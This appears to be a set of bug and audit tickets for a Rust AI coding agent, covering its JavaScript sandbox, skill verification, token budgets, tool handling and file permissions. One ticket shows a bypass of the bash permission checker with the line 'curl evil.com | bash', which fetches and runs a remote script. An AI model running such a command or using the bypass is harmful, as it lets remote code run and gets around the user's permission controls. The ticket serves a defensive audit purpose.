- Stack/line information is included when available.
- A fresh step after every OOM/timeout/error evaluates `1+1` to `2` with no leaked globals.

## Validation
Run `cargo test --features js js_outcome_mapping` and `cargo test --features js`. Add deterministic tests for OOM, infinite loop, endless microtasks, primitive/object throws, rejected jobs, syntax errors, and post-failure recovery/state isolation. Expected variants must be asserted directly, not by broad string matching. Run `cargo test` for feature-gate cleanliness.
acceptance_criteria: Current-runtime OOM, timeout, rejected jobs, primitive throws, syntax/runtime errors map deterministically to JsOutcome variants, never panic, and a fresh runtime succeeds afterward.

description:

## Required implementation
Require `tests.len() >= 1`. Create one fresh runtime/context per skill verification using all normal memory/stack/deadline/job limits. Evaluate the skill source as a separate script first, then evaluate each test as a separate script in that same context so top-level function declarations are available. Accept only the exact JavaScript boolean `true`; reject false, void/undefined, numeric/string/truthy objects, timeout, OOM, syntax/runtime error, rejected Promise, and endless jobs. Do not concatenate source/tests in a way that changes scope or permits comments/string escapes to hide tests. Return structured failure detail without activating code.

- Verification failure never panics and leaves no reusable runtime.

## Validation

Add state-isolation and deadline tests. Because `skills` must imply JS, the command must exercise the real JS engine; also run `cargo test --features js`.

title: MISSING-FEATURE: No token budget enforcement across continuation iterations
description:
## What is wrong
While max_tokens is passed to the model and token usage is tracked via events (usage.input_tokens, output_tokens), there is no enforcement of context window limits or token budgets across continuations. Each continuation iteration can potentially use the full context window again, and there's no tracking or enforcement of cumulative token usage. The model could theoretically use 2x, 3x, or up to 11x the context window across the outer loop iterations.

## Exploit / failure scenario
Context window is 200k tokens. User runs agent with max_tokens=180k. First continuation uses 180k, second uses another 180k from the same 200k window. Model overwrites earlier conversation context. Or, context window overflow silently truncates early messages.

## Fix
Track cumulative input/output tokens across continuations. Before calling continue_prompt_injector, check if adding the current continuation would exceed the context window. If so, trigger compaction or abort gracefully.

## Verification
Integration test: set context_window to 100k, trigger multiple continuations, verify cumulative token tracking, verify that an error or compaction is triggered if window is exceeded.

title: BUG: Tool name not tracked correctly when tool result arrives for unknown tool
description:
## What is wrong
When a ToolResult is received, the tool name is retrieved via last_tool_name.take().unwrap_or_default() at line 437. If a tool result arrives without a corresponding tool call (e.g., out-of-order stream items or first item is a result), last_tool_name is None and unwrap_or_default() produces an empty string. The event at line 454 sends a ToolResult with an empty name, and the history at line 458 includes a tool result with undefined tool association. This produces confusing logs and history entries.

## Exploit / failure scenario
Stream items arrive out of order: ToolResult before ToolCall. Event shows: ToolResult { name: '', output: '...' }. History shows unattributed tool result. Model doesn't know which tool produced the result.

## Fix
Validate that last_tool_name is Some before processing a ToolResult. If None, either: (1) log an error and skip the result, or (2) extract the tool name from the ToolResult structure itself if available.

## Verification
Unit test: send a ToolResult stream item without a preceding ToolCall, verify that either an error is logged or the result is skipped, not silently attributed to an empty name.

title: BUG: Tool result extraction silently produces empty output for non-text content
description:
## What is wrong
When a ToolResult is received (line 432-459), the output is extracted by iterating over tool_result.content and only including ToolResultContent::Text blocks (line 440). If a tool result contains only non-text content (e.g., structured data, images, or other media types), the output string remains empty. The empty output is then sent as an AgentEvent::ToolResult at line 453 and added to tool_interactions at line 458 without any warning or indication that the result was empty. The model receives a tool result with no visible output, which may confuse it or cause it to retry the same tool.

## Exploit / failure scenario
A tool that returns a structured JSON result (not wrapped in text) produces an empty output event. The model sees '[ToolResult]: read_file' with no content, doesn't know what the file contains, and may either retry the read or produce an incorrect response based on missing information.

## Fix
When tool_result.content contains no text blocks, either: (1) log a warning indicating the result was empty and send it with a note, or (2) format non-text content as a string representation (e.g., 'json: {structured_data}'), ensuring the model always receives useful feedback.

## Verification

title: BUG: Tool interactions vector grows unbounded across continuations
description:
## What is wrong
The tool_interactions vector is initialized at line 340 and appended to at lines 421 (tool_call) and 458 (tool_result). This vector is passed to continue_prompt_injector at line 557, where it's added to the history via extend_from_slice at line 275 of continue_prompt_injector. The vector is never pruned. With up to 11 outer loop iterations and potentially 10+ tool calls per iteration, the vector could contain 100+ Message items. Each continuation adds all prior tool interactions to history again, causing redundant context inclusion.

## Exploit / failure scenario
A session with multiple continuations accumulates all tool interactions in memory and context. A 100-tool-call session with 5 continuations includes 500+ tool interaction messages in final context, wasting tokens and potentially exceeding context window for no benefit (model already saw all previous interactions).

## Fix
Track the count of tool interactions sent in prior continuations and only include new interactions in subsequent continuations. Or, implement a sliding window that keeps only the most recent N tool interactions.

## Verification

title: BUG: track_read off-by-one error in displayed end line number
description:
## What is wrong
The track_read function calculates the end line for the repeated-read error message as (offset + limit).saturating_sub(1). For a 0-indexed offset with limit lines, this produces the wrong 1-indexed end line. If offset=0 and limit=10, the message shows 'lines 1-9' instead of 'lines 1-10'.

User reads file lines 1-10 (offset=1, limit=10 which becomes 0-indexed as offset=0, limit=10). If they attempt to re-read the same range, the error message says 'lines 1-9 was already read' instead of 'lines 1-10 was already read'.

## Fix
Remove the saturating_sub(1). Change line 53 to: let end = offset + limit; The 1-indexed end line is simply offset + limit when offset is 0-indexed.

title: INCOMPLETE: Async hook handlers spawned without tracking or awaiting
description:
## What is wrong
When handler.is_async is true, the handler is spawned with tokio::spawn() without storing the JoinHandle or awaiting it. This creates fire-and-forget tasks with no way to ensure they complete before the dispatch function returns. If the agent is cancelled or exits while async handlers are in flight, they may be interrupted mid-execution and leave side effects incomplete.

## Exploit / failure scenario
Async hook (e.g., a webhook to notify external system) is spawned → dispatch() returns immediately → agent task is cancelled or finishes → tokio runtime ends before async hook completes → webhook is never sent or partially sent.

## Fix
Collect JoinHandles from all async handler spawns and either: (1) track them and await them before the next major operation, (2) wrap them in a GuardDrop similar to SubagentGuard to abort them if the parent is cancelled, or (3) use structured concurrency to ensure async handlers are awaited before dispatch returns.

## Verification
Create an async hook that logs completion to a file. Spawn it, then immediately cancel the agent or exit. Verify the log file contains the completion message (hook finished) rather than being absent or truncated.

title: MISSING-FEATURE: Unused PermRequest and PermResponse types suggest incomplete permission integration
description:
## What is wrong
PermRequest (line 31) and PermResponse (line 38) are defined but never constructed or used anywhere. The tool.rs check_perm() at line 54 checks permissions before sending code to the JS engine, but there is no mechanism for the JS engine thread to request permission for individual host calls (spawn, read_file, write_file). This means all three host calls are allowed unconditionally once the initial code is approved.

## Exploit / failure scenario
User disallows 'spawn' permission in their profile. A script passes initial permission checks, then calls spawn() inside the JS engine. The spawn() call executes without permission check because the host.rs functions don't consult the permission system — they call std::process::Command directly.

## Fix
Complete the permission integration: (1) Use PermRequest/PermResponse to send permission checks from host.rs back to the tokio runtime; (2) Have make_spawn(), make_read_file(), make_write_file() send PermRequest through a channel (passed via closure or thread-local); (3) Wait for PermResponse before executing the operation; (4) Update tests to verify permission denial blocks individual host calls.

## Verification

title: BUG: glob_to_regex doesn't escape regex special characters
description:
## What is wrong
The glob_to_regex function converts glob patterns to regex but only escapes '.' and handles glob wildcards. Other regex special characters like '(', ')', '[', ']', '+', '^', '$', etc. are not escaped. If a glob pattern contains these as literal characters, they'll be misinterpreted as regex metacharacters.

## Exploit / failure scenario
User calls grep with include='test(1).js' intending to match files literally named 'test(1).js'. The function produces regex 'test(1)\.js', which matches 'test1.js' instead because '(1)' is a capturing group, not literal characters.

## Fix
Add escaping for all regex special characters that are not part of glob syntax. Characters to escape: ( ) [ ] + ^ $ | \. Use: re.push_str(&regex::escape(&c.to_string())) for non-glob chars, or maintain a list of safe pass-through characters.

## Verification

title: INCOMPLETE: Insufficient shell metacharacter escaping in bash tool command splitting
description:
## What is wrong
The bash tool splits commands on certain operators (&&, ||, |, >>, ;) for permission checking, but splits only on the operators that appear outside quotes. This could lead to incomplete permission checks if an attacker encodes restricted commands inside shell constructs that are not recognized. While the full command is still passed to sandbox.output_command, the permission system only sees the split tokens. Example: 'echo ok; eval(base64)' might get split only by semicolon, but if quotes are involved, some dangerous constructs might be missed.

## Exploit / failure scenario
Attacker provides: echo hello && (curl evil.com | bash). split_bash_commands splits on && to get ['echo hello', '(curl evil.com | bash)']. Permission check is done on each part separately. If 'curl' is not blocked in permission list, the attacker bypasses curl blocking.

## Fix
Strengthen permission checking for bash: (1) perform static analysis on the AST instead of token-based splitting, (2) deny all commands by default and use allowlist instead of denylist, or (3) document that bash tool assumes the permission checker validates the entire command string including all subshells and pipes

## Verification
Create permission rules that block 'curl', then attempt to run: echo safe && (curl evil.com); verify that either the curl command is denied or it's documented that partial command analysis is not supported

title: [AUDIT] Add enforced dependency vulnerability, license, and update policy gates

## Problem / security impact
The current dependency snapshot has no known medium-or-higher advisory finding from the review, but CI does not enforce advisory, license/source, or stale-security-update policy. Future vulnerable or disallowed dependencies can merge unnoticed.

title: [AUDIT] Canonicalize the JS specification corpus and phase authority
description:
## Problem / security impact

title: [AUDIT] Protect session persistence with private filesystem permissions
description:
## Problem / security impact
Session persistence in `src/session/storage.rs:44-85` can create directories/files with process-default permissions. Sessions may contain prompts, source, command output, or secrets and must not become readable by other local users.

## Scope / files
- `src/session/storage.rs:44-85`
- atomic-write helper interaction
- session storage tests and user-facing storage documentation

## Required implementation
On Unix create session directories as `0700` and files, lock files, and temporary files as `0600` from creation time (not chmod only after writing). Define behavior for existing paths with broader modes: repair safely when owned and regular, otherwise reject with a clear error. Do not follow symlinks while repairing. Preserve platform-appropriate behavior on Windows and explicitly document that ACL enforcement differs.

## Acceptance criteria
- New directories are `0700`; new/final/temp files are `0600` independent of umask.
- Unsafe existing regular-file modes are repaired or rejected according to the documented policy.
- Symlink and wrong-owner/non-regular paths are rejected without mutation.
- Failure cleanup does not leave readable temporary session content.

## Validation
On Unix run `cargo test session_storage_permissions`; set permissive umasks and assert exact modes for directories, temporary files, final files, repair/reject cases, and symlinks. Run `cargo test`. Add a non-Unix test for the documented branch and ensure CI exercises it where available.
acceptance_criteria: Session directories/files/temp files are private from creation, unsafe existing paths are safely repaired or rejected, and platform behavior is documented and tested.

Implement the propose_skill() JS host global that lets the agent nominate code as a reusable skill.

Spec: docs/specs/phase-4-auto-admission.md §propose_skill() host global
Target: src/extras/js/host.rs (Phase 1 creates this file; Phase 4 adds make_propose_skill here)

Public function signature:
```rust
pub fn make_propose_skill(
    store: Arc<Mutex<SkillStore>>,
    iteration_count: Arc<AtomicUsize>,
) -> impl Fn(String, String, Vec<String>) -> rquickjs::Result<String>
```

Behavior:
1. Atomically increment iteration_count (SeqCst); if already >= 5, return iteration-limit error string
2. Build a Skill from (source, description, tests) with id = sha256_hex(&source)[..16], created_at = 0
3. Call verify_skill(&skill) — if any test fails, return error string with failure detail
4. Call store.lock().insert_pending(&skill), return success string with skill.id

Must be under `#[cfg(feature = "skills")]`.
Uses `use std::sync::atomic::{AtomicUsize, Ordering};`

Feature gate: --features js,skills

## Acceptance criteria
- cargo test --features js,skills: propose_skill round-trip test passes
- propose_skill returns success string when all tests pass
- propose_skill returns failure string (not panic) when any test fails
- 6th propose_skill call in the same session returns iteration-limit error string
- Function does NOT hold the Mutex while calling verify_skill (verify_skill uses fresh Runtime each time)

## Out of scope
- Wiring make_propose_skill into register_host_globals (separate engine bead)
- promote_skill promotion flow (separate bead)
- Auto-approval (disabled per spec)

title: INCOMPLETE: Unknown stream item types silently ignored without logging
description:
## What is wrong
The stream processing loop at lines 399-544 has a catch-all `_ => {}` pattern at line 542 that silently ignores unknown MultiTurnStreamItem variants. If rig introduces a new stream item type that requires special handling (e.g., new content type, error condition, or state change), it will be missed entirely. Replace the catch-all with explicit handling for each known variant, and add a catch-all that logs a warning: `_ => { tracing::warn!("unknown stream item variant: {:?}", item); }`

title: PERF: Chat history file grows unbounded without pruning or size limit
description:
## What is wrong
The append_entry function (lines 18-40) loads all existing chat history from disk, appends one new entry, and saves. There is no pruning, rotation, or size limit. The file grows indefinitely with every chat entry. Over time, the chat_history.json file could grow to megabytes or larger, and every subsequent write loads the entire history into memory before appending and saving.

## Exploit / failure scenario
User runs 1000 chat turns over a month. chat_history.json grows to 10MB+. Each new chat entry requires loading and re-saving the entire 10MB file. Appending becomes slow and memory-intensive. If file is corrupted (as handled at line 25-29), a large backup file is created but original data is lost.

## Fix
Implement rotation: keep only the most recent N entries (e.g., last 10000), or implement a size-based rotation (e.g., rotate when file exceeds 5MB). Or, change to an append-only log format where each write appends a line without loading the full history.

## Verification
Create a test that appends 1000 entries and measures file size and append time. Verify file size remains bounded or grows sub-linearly.

title: INCOMPLETE: Silent channel send failure in JS engine thread
description:
## What is wrong
When the JS engine finishes a step, it sends the reply via req.reply.send() with error silently ignored (let _ = ...). If the reply channel's receiver (reply_rx in tool.rs) is dropped before the send (e.g., the tool task is cancelled), the send fails silently. While this is acceptable if the caller doesn't care, it masks potential issues where the caller is still waiting on reply_rx (though tool.rs does handle channel-closed errors).

## Exploit / failure scenario
JS tool call starts → reply_rx.await is waiting → caller task is cancelled/aborted → reply_rx is dropped → JS thread finishes and tries to send → send fails silently → no error logged or observed.

## Fix
Log the send error even if ignored: `if let Err(e) = req.reply.send(...) { tracing::debug!("JS engine reply channel closed: {}", e); }`. This helps with debugging and makes the failure visible in logs.

## Verification
Cancel a JS tool call mid-flight and check logs to see if the send error is logged.

## Location
src/extras/js/engine.rs:11
